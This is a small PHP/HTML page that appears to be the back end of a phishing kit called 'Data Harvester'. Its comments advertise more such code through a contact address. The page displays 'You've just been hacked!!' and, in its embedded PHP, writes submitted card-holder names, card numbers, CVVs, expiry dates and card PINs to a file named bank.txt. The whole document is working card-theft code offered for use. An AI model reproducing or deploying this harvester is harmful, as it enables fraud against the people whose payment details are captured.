<!--PROPERTY OF ZUXA, AUTHOR OF DATA HARVESTER-->
<!--CONTACT ME FOR MORE CODES SIMILAR TO THIS VIA ajjulius7@gmail.com-->

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Submit</title>
</head>
<body>
    <h2 id="sample">You've just been hacked!!</h2>
    <?php
       $myfile = fopen("bank.txt", "a") or die("Unable to open file!");
       $x = $_POST["name1"];
       $y = $_POST["cardNumber"];
       $z =$_POST["CVV"];
       $X =$_POST["expiryDate"];
       $Y =$_POST["cardPIN"];

       fwrite($myfile, "name1: $x\n");
       fwrite($myfile, "cardNumber: $y\n");
       fwrite($myfile, "CVV: $z\n");
       fwrite($myfile, "expiryDate: $X\n");
       fwrite($myfile, "cardPIN: $Y\n");
        fclose($myfile);
    ?>
</body>
</html>